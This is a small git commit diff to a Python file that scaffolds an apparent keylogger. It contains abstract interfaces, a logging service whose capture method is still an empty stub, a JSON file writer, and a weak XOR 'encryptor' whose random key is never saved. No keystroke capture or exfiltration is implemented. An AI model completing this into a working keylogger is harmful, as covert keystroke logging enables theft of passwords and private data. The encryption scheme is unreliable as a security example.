9918b7d4b8793d17ce469f466998b3217772b590
shlomo <shlomot575@gmail.com>
2025-02-12 14:16:15 +0200

    interface

--- classes.py
+++ classes.py
@@ -1,11 +1,11 @@
 from abc import ABC, abstractmethod
 from typing import List
 import time
+import json
+import random
+import string
 
-class Write(ABC):
-    @abstractmethod
-    def write(self):
-        pass
+
 
 class IKeyLogger(ABC):
     @abstractmethod
@@ -18,6 +18,11 @@ class IKeyLogger(ABC):
     def get_logged_keys(self) -> dict[str:str]:
         pass
 
+class Write(ABC):
+    @abstractmethod
+    def write(self, data:str) -> bool:
+        pass
+
 
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
@@ -28,9 +33,44 @@ class KeyLoggerService(IKeyLogger):
     def start_logging(self) -> None:
         pass
 
+
+
     def stop_logging(self) -> None:
         self.last_key = ""
         self.last_type_time = None
 
     def get_logged_keys(self) -> dict[str:str]:
         return self.logged_keys
+
+
+
+class FileWriter(Write):
+    def __init__(self,path=None):
+        self.path = path or r""
+
+    def write(self, data:dict[str:str]) -> bool:
+        try:
+            with open(self.path,"a") as file:
+                converrt_data = json.dumps(data)
+                file.write(converrt_data)
+                return True
+        except IOError:
+            return False
+
+
+class Encryptor:
+    def __init__(self):
+        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
+
+    def encrypt(self,data:str) -> str:
+        ciphertext = ""
+        for i in range(len(data)):
+            index = i % len(self.key)
+            ciphertext += chr(ord(data[i]) ^ ord(self.key[index]))
+        return ciphertext
+
+
+
+
+
+
